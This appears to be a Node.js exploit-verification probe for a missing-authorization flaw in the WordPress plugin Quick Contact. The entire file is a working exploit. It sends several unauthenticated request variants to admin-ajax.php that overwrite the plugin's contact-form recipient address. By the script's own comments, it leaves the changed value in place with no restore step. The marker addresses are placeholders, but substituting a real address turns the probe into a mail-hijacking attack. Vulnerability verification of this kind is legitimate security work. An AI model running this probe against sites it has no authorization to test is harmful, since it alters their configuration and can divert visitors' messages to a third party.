// probe.mjs - exploit-verification probe for Quick Contact <= 1.0.0
// Missing authorization on the wp_ajax_nopriv_qc_save_settings action.
//
// Usage: node probe.mjs <base-url>
// Exit 0 = VULNERABLE (an unauthenticated settings write was accepted)
// Exit 1 = NOT VULNERABLE (every variant was rejected)
// Exit 2 = INDETERMINATE (bad arguments or target unreachable / non-WordPress response)
//
// Only requests to the given base URL are made. Redirects are not followed.

const EXIT_VULNERABLE = 0;
const EXIT_NOT_VULNERABLE = 1;
const EXIT_INDETERMINATE = 2;

function log(msg) {
  process.stderr.write(msg + "\n");
}

const rawBase = process.argv[2];
if (!rawBase) {
  log("usage: node probe.mjs <base-url>");
  process.exit(EXIT_INDETERMINATE);
}

let base;
try {
  base = new URL(rawBase);
} catch {
  log("invalid base URL");
  process.exit(EXIT_INDETERMINATE);
}
if (base.protocol !== "http:" && base.protocol !== "https:") {
  log("base URL must be http or https");
  process.exit(EXIT_INDETERMINATE);
}

const ENDPOINT = new URL("/wp-admin/admin-ajax.php", base);
const TIMEOUT_MS = 10000;

// Unique, non-keyword-looking marker values. Each variant gets its own value.
const runId = Math.random().toString(16).slice(2, 10);
function marker(n) {
  return `qcv-${runId}-${n}@verify.example.net`;
}

// Each variant describes one realistic way of delivering the same unauthenticated
// request to the handler. The handler reads $_REQUEST, so both GET and POST, and
// both query-string and body parameters, reach it.
function buildVariants() {
  return [
    {
      name: "POST urlencoded (action+recipient in body)",
      method: "POST",
      query: {},
      body: () =>
        new URLSearchParams({ action: "qc_save_settings", recipient: marker(1) }),
    },
    {
      name: "GET query string (action+recipient in URL)",
      method: "GET",
      query: () => ({ action: "qc_save_settings", recipient: marker(2) }),
      body: null,
    },
    {
      name: "POST multipart/form-data",
      method: "POST",
      query: {},
      body: () => {
        const fd = new FormData();
        fd.append("action", "qc_save_settings");
        fd.append("recipient", marker(3));
        return fd;
      },
    },
    {
      name: "action in URL, recipient in POST body",
      method: "POST",
      query: () => ({ action: "qc_save_settings" }),
      body: () => new URLSearchParams({ recipient: marker(4) }),
    },
    {
      name: "action in POST body, recipient in URL",
      method: "POST",
      query: () => ({ recipient: marker(5) }),
      body: () => new URLSearchParams({ action: "qc_save_settings" }),
    },
    {
      name: "POST urlencoded with extra benign parameter",
      method: "POST",
      query: {},
      body: () =>
        new URLSearchParams([
          ["action", "qc_save_settings"],
          ["recipient", marker(6)],
          ["_", "1"],
        ]),
    },
  ];
}

function resolveVariant(v) {
  const q = typeof v.query === "function" ? v.query() : v.query;
  const body = typeof v.body === "function" ? v.body() : v.body;
  const url = new URL(ENDPOINT.toString());
  for (const [k, val] of Object.entries(q)) url.searchParams.set(k, val);
  return { url, body };
}

// Returns ok=true only if the handler responded with a JSON success payload.
// Anything else (0 from admin-ajax, error JSON, 403, HTML, network error) is a rejection.
async function runVariant(v) {
  const { url, body } = resolveVariant(v);
  let res;
  try {
    res = await fetch(url, {
      method: v.method,
      body: v.method === "POST" ? body : undefined,
      redirect: "manual",
      signal: AbortSignal.timeout(TIMEOUT_MS),
      headers: { Accept: "application/json" },
    });
  } catch (err) {
    return { ok: false, detail: `request error: ${err.message}`, reachable: false };
  }

  const text = await res.text();
  let parsed = null;
  try {
    parsed = JSON.parse(text);
  } catch {
    parsed = null;
  }
  const accepted = res.status === 200 && parsed !== null && parsed.success === true;
  return {
    ok: accepted,
    reachable: true,
    detail: `HTTP ${res.status}, body=${text.slice(0, 120).replace(/\s+/g, " ")}`,
  };
}

async function main() {
  const variants = buildVariants();
  let anyReachable = false;
  let vulnerable = false;

  for (const v of variants) {
    const r = await runVariant(v);
    if (r.reachable) anyReachable = true;
    log(`[${r.ok ? "ACCEPTED" : "rejected"}] ${v.name}: ${r.detail}`);
    if (r.ok) {
      vulnerable = true;
      break; // one accepted unauthenticated write is sufficient
    }
  }

  if (vulnerable) {
    log("RESULT: VULNERABLE - unauthenticated qc_save_settings request was accepted.");
    // The stored recipient cannot be read back over HTTP and the original value is
    // unknown to this probe, so no restore step is performed.
    process.exit(EXIT_VULNERABLE);
  }

  if (!anyReachable) {
    log("RESULT: INDETERMINATE - target unreachable; no variant got an HTTP response.");
    process.exit(EXIT_INDETERMINATE);
  }

  log("RESULT: NOT VULNERABLE - all variants were rejected.");
  process.exit(EXIT_NOT_VULNERABLE);
}

main().catch((err) => {
  log(`probe error: ${err && err.stack ? err.stack : err}`);
  process.exit(EXIT_INDETERMINATE);
});
